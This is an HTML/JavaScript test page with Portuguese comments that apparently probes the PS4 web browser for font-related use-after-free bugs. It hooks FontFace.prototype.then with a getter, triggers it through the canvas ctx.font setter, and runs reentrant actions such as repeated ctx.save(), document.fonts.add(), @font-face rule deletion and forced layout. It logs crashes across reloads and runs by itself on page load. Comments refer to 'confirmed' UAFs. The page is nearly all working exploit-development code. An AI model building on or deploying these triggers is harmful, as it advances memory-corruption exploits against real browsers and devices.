<style>
body{background:#111;color:#ddd;font-family:monospace;font-size:13px;padding:6px;margin:0}

button{margin:2px;padding:3px 10px;background:#333;color:#ddd;border:1px solid #555;cursor:pointer}
</style>
</head>

<body>
<div id="err"></div>
<div id="st">Pronto</div><br>
<button onclick="runAll()">Executar</button>
<button onclick="clearLS()">Limpar LS</button>
<button onclick="location.reload()">Reload</button>
<div id="out"></div>

<script>
// ES5 puro — sem strict mode, sem Unicode literal em JS, sem ES6
// CORRECAO PRINCIPAL: ctx.font setter e o trigger real no PS4.
// Ordem obrigatoria: (1) criar face, (2) instalar getter,
//                   (3) chamar ctx.font = ... como trigger.

window.onerror = function(msg, url, line) {
    var e = document.getElementById('err');
    e.style.display = 'block';
    e.innerHTML = 'ERRO JS linha ' + line + ': ' + msg;
    return true;
};

var OUT = null;
var CUR = null;
var LS = 'ps4d4_';

function setStatus(s) { document.getElementById('st').innerHTML = s; }

function newSection(title) {
    OUT = OUT || document.getElementById('out');
    var h = document.createElement('h2');
    h.innerHTML = title;
    OUT.appendChild(h);
    CUR = document.createElement('div');
    OUT.appendChild(CUR);
}

function newSubSection(title) {
    var h = document.createElement('h3');
    h.innerHTML = title;
    CUR.appendChild(h);
}

function addRow(label, val, cls) {
    var c = cls || (val === true ? 'ok' : val === false ? 'no' : 'in');
    var d = val === true ? 'SIM' : val === false ? 'NAO' : String(val);
    var r = document.createElement('div');
    r.className = 'r';
    r.innerHTML = '<span class="l">' + label + '</span><span class="' + c + '">' + d + '</span>';
    CUR.appendChild(r);
}

function lsSet(k, v) { try { localStorage.setItem(LS+k, v); } catch(e) {} }
function lsGet(k)    { try { return localStorage.getItem(LS+k); } catch(e) { return null; } }
function lsDel(k)    { try { localStorage.removeItem(LS+k); } catch(e) {} }

function clearLS() {
    try {
        var keys = [];
        for (var i = 0; i < localStorage.length; i++) {
            var k = localStorage.key(i);
            if (k && k.indexOf(LS) === 0) keys.push(k);
        }
        for (var j = 0; j < keys.length; j++) localStorage.removeItem(keys[j]);
    } catch(e) {}
    setStatus('LS limpo');
}

function cleanGetter() {
    try {
        Object.defineProperty(FontFace.prototype, 'then', {
            configurable: true, writable: true, value: undefined
        });
    } catch(e) {}
}

// Ordem correta: face -> getter -> ctx.font (trigger)
// NUNCA chamar ctx.font antes de instalar o getter
function runFontSetterTest(familyName, action) {
    var c = document.createElement('canvas');
    c.width = 64; c.height = 64;
    var ctx = c.getContext('2d');

    // 1. Cria face — sem ctx.font ainda
    var face = new FontFace(familyName, 'local(Helvetica)');
    document.fonts.add(face);
    void face.loaded;

    // 2. Instala getter com a acao de reentrancia
    var fired = false, done = false, errMsg = null;
    Object.defineProperty(FontFace.prototype, 'then', {
        configurable: true,
        get: function() {
            if (fired) return undefined;
            fired = true;
            try { action(ctx, face); done = true; }
            catch(e) { errMsg = e.message; }
            return undefined;
        }
    });

    // 3. TRIGGER: ctx.font setter dispara o getter
    try {
        ctx.font = '10px ' + familyName;
    } catch(e) {
        cleanGetter();
        return { fired: fired, done: done, err: 'trigger ERRO: ' + e.message };
    }
    cleanGetter();
    return { fired: fired, done: done, err: errMsg };
}

// ============================================================
// A: ctx.font trigger + acoes de reentrancia — confirmacao
// ============================================================
function sA() {
    newSection('A. ctx.font TRIGGER — acoes de reentrancia (ordem correta)');

    if (typeof FontFace === 'undefined') { addRow('FontFace ausente','skip','wn'); return; }

    var prev = lsGet('A_crash');
    if (prev) { addRow('!! CRASH SESSAO ANTERIOR em', prev, 'cr'); lsDel('A_crash'); }

    var actions = [
        {
            name: 'ctx.save() x1',
            fn: function(ctx) { ctx.save(); }
        },
        {
            name: 'ctx.save() x8',
            fn: function(ctx) { for(var i=0;i<8;i++) ctx.save(); }
        },
        {
            name: 'ctx.save() x32',
            fn: function(ctx) { for(var i=0;i<32;i++) ctx.save(); }
        },
        {
            name: 'ctx.save() x128',
            fn: function(ctx) { for(var i=0;i<128;i++) ctx.save(); }
        },
        {
            name: 'ctx.restore()',
            fn: function(ctx) { ctx.restore(); }
        },
        {
            name: 'ctx.measureText("a") — canvas op no getter',
            fn: function(ctx) { ctx.measureText('a'); }
        },
        {
            name: 'ctx.font = tamanho diferente',
            fn: function(ctx) { ctx.font = '20px serif'; }
        },
        {
            name: 'document.fonts.add(new FontFace)',
            fn: function(ctx) {
                document.fonts.add(new FontFace('GA_'+Date.now(), 'local(Helvetica)'));
            }
        },
        {
            name: 'document.createElement("span")',
            fn: function(ctx) { document.createElement('span'); }
        },
        {
            name: 'document.body.offsetTop (layout)',
            fn: function(ctx) { void document.body.offsetTop; }
        },
        {
            name: 'style.remove() + offsetTop',
            fn: function(ctx) {
                var st = document.getElementById('_tmpA_');
                if (st && st.parentNode) st.parentNode.removeChild(st);
                void document.body.offsetTop;
            }
        },
        {
            name: 'deleteRule(@font-face) + offsetTop',
            fn: function(ctx) {
                var st = document.getElementById('_ruleA_');
                if (st && st.sheet && st.sheet.cssRules.length > 0) {
                    st.sheet.deleteRule(0);
                }
                void document.body.offsetTop;
            }
        }
    ];

    // Setup estilos removiveis
    var ts = document.createElement('style');
    ts.id = '_tmpA_'; ts.textContent = 'x{}';
    document.head.appendChild(ts);
    var rs = document.createElement('style');
    rs.id = '_ruleA_';
    rs.textContent = '@font-face{font-family:_dfA_;src:local(Helvetica);}';
    document.head.appendChild(rs);

    for (var i = 0; i < actions.length; i++) {
        var a = actions[i];
        lsSet('A_crash', a.name);
        var r = runFontSetterTest('FA' + i, a.fn);
        if (r.err && r.err.indexOf('trigger') === 0) {
            addRow(a.name, r.err, 'no');
        } else if (!r.fired) {
            addRow(a.name, 'getter NAO disparou', 'wn');
        } else if (r.err) {
            addRow(a.name, 'getter OK / acao ERRO: ' + r.err, 'no');
        } else {
            addRow(a.name, 'getter + acao OK', 'ok');
        }
    }
    lsDel('A_crash');
}

// ============================================================
// B: ctx.font trigger + ctx.save() incremental — crash detection
// ============================================================
function sB() {
    newSection('B. ctx.font TRIGGER + ctx.save() incremental (crash detection)');

    if (typeof FontFace === 'undefined') { addRow('FontFace ausente','skip','wn'); return; }

    var prev = lsGet('B_crash');
    if (prev) { addRow('!! CRASH com N saves', prev, 'cr'); lsDel('B_crash'); }

    var counts = [1, 2, 4, 8, 16, 32, 64, 128, 256, 512];
    for (var i = 0; i < counts.length; i++) {
        var n = counts[i];
        lsSet('B_crash', String(n));

        var r = runFontSetterTest('FB' + n, function(ctx) {
            for (var j = 0; j < n; j++) ctx.save();
        });

        if (!r.fired) addRow('N=' + n + ' saves', 'getter nao disparou', 'wn');
        else          addRow('N=' + n + ' saves', r.done ? 'OK sem crash' : 'save() falhou', r.done ? 'ok' : 'no');
    }
    lsDel('B_crash');
    addRow('Resultado', 'nenhum N causou crash detectavel', 'in');
}

// ============================================================
// C: ctx.font trigger + document.fonts.add() — potencial UAF
//    (mesmo mecanismo dos UAFs confirmados: CSSFontSelector)
// ============================================================
function sC() {
    newSection('C. ctx.font TRIGGER + fonts.add() — potencial CSSFontSelector UAF');

    if (typeof FontFace === 'undefined' || !('fonts' in document)) {
        addRow('APIs ausentes','skip','wn'); return;
    }

    var prev = lsGet('C_crash');
    if (prev) { addRow('!! CRASH SESSAO ANTERIOR em', prev, 'cr'); lsDel('C_crash'); }

    newSubSection('Variante 1: 1 face — fonts.add() de face nova');
    lsSet('C_crash', 'V1 fonts.add() 1 face');
    var r1 = runFontSetterTest('FC1', function(ctx) {
        document.fonts.add(new FontFace('FC1_inner_'+Date.now(), 'local(Helvetica)'));
    });
    addRow('getter disparou', r1.fired, r1.fired ? 'ok' : 'wn');
    addRow('fonts.add() executou', r1.done, r1.done ? 'ok' : 'no');
    if (r1.err) addRow('erro', r1.err, 'no');

    newSubSection('Variante 2: 2 faces mesma familia — fonts.add() (como UAF_CSSFontSelector)');
    lsSet('C_crash', 'V2 2faces mesma familia fonts.add');
    var c2 = document.createElement('canvas');
    c2.width = 64; c2.height = 64;
    var ctx2 = c2.getContext('2d');
    var face2a = new FontFace('FC2', 'local(Helvetica)');
    var face2b = new FontFace('FC2', 'local(Helvetica)');
    document.fonts.add(face2a);
    document.fonts.add(face2b);
    void face2a.loaded;
    void face2b.loaded;

    var fired2 = false, done2 = false;
    Object.defineProperty(FontFace.prototype, 'then', {
        configurable: true,
        get: function() {
            if (fired2) return undefined;
            fired2 = true;
            try {
                document.fonts.add(new FontFace('FC2_unrelated_'+Date.now(),'local(Helvetica)'));
                done2 = true;
            } catch(e) {}
            return undefined;
        }
    });
    try { ctx2.font = '10px FC2'; } catch(e) {}
    cleanGetter();
    addRow('getter disparou (2 faces)', fired2, fired2 ? 'ok' : 'wn');
    addRow('fonts.add() executou (2 faces)', done2, done2 ? 'ok' : 'no');

    newSubSection('Variante 3: ctx.font trigger + fonts.add() em loop x10');
    lsSet('C_crash', 'V3 fonts.add loop x10');
    var r3 = runFontSetterTest('FC3', function(ctx) {
        for (var k = 0; k < 10; k++) {
            document.fonts.add(new FontFace('FC3_L'+k+'_'+Date.now(),'local(Helvetica)'));
        }
    });
    addRow('getter disparou (loop)', r3.fired, r3.fired ? 'ok' : 'wn');
    addRow('fonts.add() x10 executou', r3.done, r3.done ? 'ok' : 'no');
    if (r3.err) addRow('erro', r3.err, 'no');

    lsDel('C_crash');
}

// ============================================================
// D: ctx.font trigger + deleteRule + layout — potencial UAF
//    (mecanismo do UAF_FontFace confirmado)
// ============================================================
function sD() {
    newSection('D. ctx.font TRIGGER + deleteRule + layout — potencial CSSFontFace UAF');

    if (typeof FontFace === 'undefined') { addRow('FontFace ausente','skip','wn'); return; }

    var prev = lsGet('D_crash');
    if (prev) { addRow('!! CRASH SESSAO ANTERIOR em', prev, 'cr'); lsDel('D_crash'); }

    // Monta @font-face via CSS para ser deletado
    var rStyle = document.createElement('style');
    rStyle.id = '_ruleD_';
    rStyle.textContent = '@font-face{font-family:FD_css;src:local(Helvetica);}' +
                         '@font-face{font-family:FD_css;src:local(Helvetica);unicode-range:U+0042;}';
    document.head.appendChild(rStyle);
    void document.body.offsetTop;

    newSubSection('Variante 1: face JS + deleteRule(@font-face CSS) + offsetTop');
    lsSet('D_crash', 'V1 deleteRule');

    // Face JS para U+0041 (A), CSS @font-face para U+0042 (B) — como UAF_FontFace
    var c1 = document.createElement('canvas');
    c1.width = 64; c1.height = 64;
    var ctx1 = c1.getContext('2d');

    var faceD = new FontFace('FD_js', 'local(Helvetica)');
    document.fonts.add(faceD);
    void faceD.loaded;

    var firedD = false, doneD = false;
    Object.defineProperty(FontFace.prototype, 'then', {
        configurable: true,
        get: function() {
            if (firedD) return undefined;
            firedD = true;
            try {
                var rs = document.getElementById('_ruleD_');
                if (rs && rs.sheet && rs.sheet.cssRules.length > 0) {
                    rs.sheet.deleteRule(0);
                }
                void document.body.offsetTop;
                doneD = true;
            } catch(e) {}
            return undefined;
        }
    });
    try { ctx1.font = '10px FD_js'; } catch(e) {}
    cleanGetter();

    addRow('getter disparou', firedD, firedD ? 'ok' : 'wn');
    addRow('deleteRule + layout executou', doneD, doneD ? 'ok' : 'no');

    newSubSection('Variante 2: style.remove() completo + offsetTop');
    lsSet('D_crash', 'V2 style.remove');

    var tmpSt = document.createElement('style');
    tmpSt.id = '_removeD_';
    tmpSt.textContent = '@font-face{font-family:FD_rm;src:local(Helvetica);}';
    document.head.appendChild(tmpSt);
    void document.body.offsetTop;

    var r2 = runFontSetterTest('FD_rm2', function(ctx) {
        var st = document.getElementById('_removeD_');
        if (st && st.parentNode) st.parentNode.removeChild(st);
        void document.body.offsetTop;
    });
    addRow('getter disparou (style.remove)', r2.fired, r2.fired ? 'ok' : 'wn');
    addRow('style.remove() executou', r2.done, r2.done ? 'ok' : 'no');
    if (r2.err) addRow('erro', r2.err, 'no');

    lsDel('D_crash');
}

// ============================================================
// E: Verificacao pos-getter — canvas usa font apos acao
// ============================================================
function sE() {
    newSection('E. Verificacao pos-getter — estado do canvas apos acao no getter');

    if (typeof FontFace === 'undefined') { addRow('FontFace ausente','skip','wn'); return; }

    var c = document.createElement('canvas');
    c.width = 64; c.height = 64;
    var ctx = c.getContext('2d');

    ctx.font = '20px serif';
    var base = 0;
    try { base = ctx.measureText('a').width; } catch(e) {}
    addRow('baseline serif', base, 'in');

    // Teste: apos o getter disparar via ctx.font, o canvas usa a fonte?
    var fE = new FontFace('FE', 'local(Helvetica)');
    document.fonts.add(fE);
    void fE.loaded;

    var firedE = false;
    Object.defineProperty(FontFace.prototype, 'then', {
        configurable: true,
        get: function() { firedE = true; return undefined; }
    });

    var c2 = document.createElement('canvas');
    c2.width = 64; c2.height = 64;
    var ctx2 = c2.getContext('2d');
    try { ctx2.font = '20px FE'; } catch(e) {}
    cleanGetter();

    addRow('getter disparou ao setar ctx.font', firedE, firedE ? 'ok' : 'wn');

    // Mede com a fonte FE apos o ctx.font ter sido setado
    var w = 0;
    try { w = ctx2.measureText('a').width; } catch(e) {}
    addRow('width apos ctx.font = FE', w, 'in');
    addRow('width diferente do baseline?', w !== base, w !== base ? 'ok' : 'wn');

    // Testa se ctx.measureText DEPOIS do setter dispara getter
    var firedM = false;
    Object.defineProperty(FontFace.prototype, 'then', {
        configurable: true,
        get: function() { firedM = true; return undefined; }
    });
    try { ctx2.measureText('a'); } catch(e) {}
    cleanGetter();
    addRow('measureText DEPOIS do setter dispara getter?', firedM, firedM ? 'ok' : 'wn');
}

// ============================================================
// MAIN
// ============================================================
function runAll() {
    OUT = document.getElementById('out');
    OUT.innerHTML = '';
    setStatus('Rodando...');

    var prevCrash = lsGet('A_crash') || lsGet('B_crash') || lsGet('C_crash') || lsGet('D_crash');
    if (prevCrash) {
        newSection('!! CRASH DETECTADO NA SESSAO ANTERIOR !!');
        addRow('Teste que crashou', prevCrash, 'cr');
        ['A_crash','B_crash','C_crash','D_crash'].forEach(function(k){ lsDel(k); });
    }

    try { sA(); } catch(e) { if(CUR) addRow('SA ERRO FATAL',''+e,'no'); }
    try { sB(); } catch(e) { if(CUR) addRow('SB ERRO FATAL',''+e,'no'); }
    try { sC(); } catch(e) { if(CUR) addRow('SC ERRO FATAL',''+e,'no'); }
    try { sD(); } catch(e) { if(CUR) addRow('SD ERRO FATAL',''+e,'no'); }
    try { sE(); } catch(e) { if(CUR) addRow('SE ERRO FATAL',''+e,'no'); }

    setStatus('Concluido');
}

setTimeout(function() { runAll(); }, 300);
</script>
</body>
</html>
